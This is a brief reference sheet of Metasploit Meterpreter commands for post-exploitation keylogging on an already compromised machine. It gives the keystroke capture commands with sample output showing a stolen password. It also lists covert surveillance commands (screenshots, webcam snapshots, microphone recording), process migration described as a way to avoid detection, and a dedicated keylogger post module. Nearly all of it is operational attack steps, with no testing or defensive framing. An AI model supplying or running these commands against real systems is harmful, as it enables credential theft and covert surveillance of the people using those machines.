METASPLOIT KEYLOGGER COMMANDS REFERENCE
=====================================

Once you have an active Meterpreter session, use these commands for keylogging:

BASIC KEYLOGGER COMMANDS:
------------------------
keyscan_start       - Start capturing keystrokes
keyscan_stop        - Stop capturing keystrokes  
keyscan_dump        - Display captured keystrokes

USAGE EXAMPLE:
--------------
meterpreter > keyscan_start
Started keylogger on session 1

meterpreter > keyscan_dump
Dumping captured keystrokes...
<Back><Back><Back><Back>password123<Return>

meterpreter > keyscan_stop
Stopped keylogger on session 1

ADDITIONAL USEFUL COMMANDS:
--------------------------
sysinfo            - Get system information
getuid             - Get current user ID
ps                 - List running processes
screenshot         - Take a screenshot
webcam_snap        - Take webcam picture
record_mic         - Record from microphone
idletime           - Get idle time of user
migrate <PID>      - Migrate to another process (helps avoid detection)

POST-EXPLOITATION KEYLOGGER MODULE:
----------------------------------
To use the dedicated keylogger post-exploitation module:

meterpreter > run post/windows/capture/keylog_recorder
